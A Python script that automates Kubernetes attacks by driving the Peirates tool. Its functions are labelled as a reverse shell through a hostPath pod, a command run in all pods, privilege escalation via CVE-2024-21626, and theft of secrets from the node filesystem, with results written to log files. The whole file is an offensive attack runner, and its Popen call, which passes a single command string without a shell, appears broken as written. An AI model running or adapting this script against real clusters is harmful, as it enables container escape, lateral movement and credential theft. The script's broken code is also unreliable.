#!/usr/bin/env python3
import os
import subprocess

# Directory for logs
LOG_DIR = "./logs"
os.makedirs(LOG_DIR, exist_ok=True)

def write_to_log(filename, content):
    """Записывает вывод команды в лог-файл."""
    with open(filename, "w") as log_file:
        log_file.write(content + "\n")

def run_command(command):
    """Выполняет команду и возвращает вывод."""
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT).decode("utf-8")
        return output
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode('utf-8')}"

def execute_peirates_action(action_number, additional_input=None):
    """Выполняет конкретное действие утилиты peirates."""
    print(f"[+] Executing Peirates action {action_number}...")
    command = f"peirates {action_number}"

    process = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = process.communicate(input=additional_input)

    if process.returncode == 0:
        return stdout
    else:
        return stderr

def perform_attack_20():
    """Выполняет атаку 20 (обратная оболочка через hostPath)."""
    print("[+] Performing attack 20: Reverse shell using hostPath pod...")
    output = execute_peirates_action(20)
    write_to_log(os.path.join(LOG_DIR, "attack_20.log"), output)
    print("[+] Attack 20 completed. Log saved to attack_20.log.")

def perform_attack_21():
    """Выполняет атаку 21 (запуск команды во всех подах)."""
    print("[+] Performing attack 21: Running command in all pods...")
    additional_input = "2\necho 'Testing Peirates Command'\n"
    output = execute_peirates_action(21, additional_input)
    write_to_log(os.path.join(LOG_DIR, "attack_21.log"), output)
    print("[+] Attack 21 completed. Log saved to attack_21.log.")

def perform_attack_23():
    """Выполняет атаку 23 (CVE-2024-21626 - доступ к хосту)."""
    print("[+] Performing attack 23: Attempting privilege escalation via CVE-2024-21626...")
    output = execute_peirates_action(23)
    write_to_log(os.path.join(LOG_DIR, "attack_23.log"), output)
    if "Permission Denied" in output:
        print("[-] Attack 23 failed: Permission Denied.")
    else:
        print("[+] Attack 23 completed. Log saved to attack_23.log.")

def perform_attack_30():
    """Выполняет атаку 30 (кража секретов из файловой системы узла)."""
    print("[+] Performing attack 30: Stealing secrets from the node filesystem...")
    output = execute_peirates_action(30)
    write_to_log(os.path.join(LOG_DIR, "attack_30.log"), output)
    if "path does not exist" in output:
        print("[-] Attack 30 failed: Path does not exist.")
    else:
        print("[+] Attack 30 completed. Log saved to attack_30.log.")

def main():
    print("[+] Starting Peirates attacks...")

    # Выполняем атаки
    perform_attack_20()
    perform_attack_21()
    perform_attack_23()
    perform_attack_30()

    print("[+] All Peirates attacks completed. Check logs for detailed results.")

if __name__ == "__main__":
    main()
